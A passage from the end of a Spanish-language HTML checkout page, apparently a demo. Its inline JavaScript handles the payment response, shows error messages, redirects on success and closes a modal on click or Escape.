                            mensajeFormulario.textContent = 'No se pudo procesar el pago. Intenta de nuevo.';
                            return;
                        }
                        // Redirigir al destino final
                        window.location.href = resp.url;
                    })
                    .catch(function () {
                        botonPagarPasoDos.disabled = false;
                        ocultarOverlayCargando();
                        mensajeFormulario.textContent = 'Error de conexión. Intenta de nuevo.';
                    });
            });

            modalDemo.addEventListener('click', function (evento) {
                if (evento.target && evento.target.hasAttribute('data-cerrar-modal')) {
                    cerrarModal();
                }
            });

            document.addEventListener('keydown', function (evento) {
                if (evento.key === 'Escape') {
                    cerrarModal();
                }
            });

            cargarResumen();
        })();
    </script>
</body>

</html>
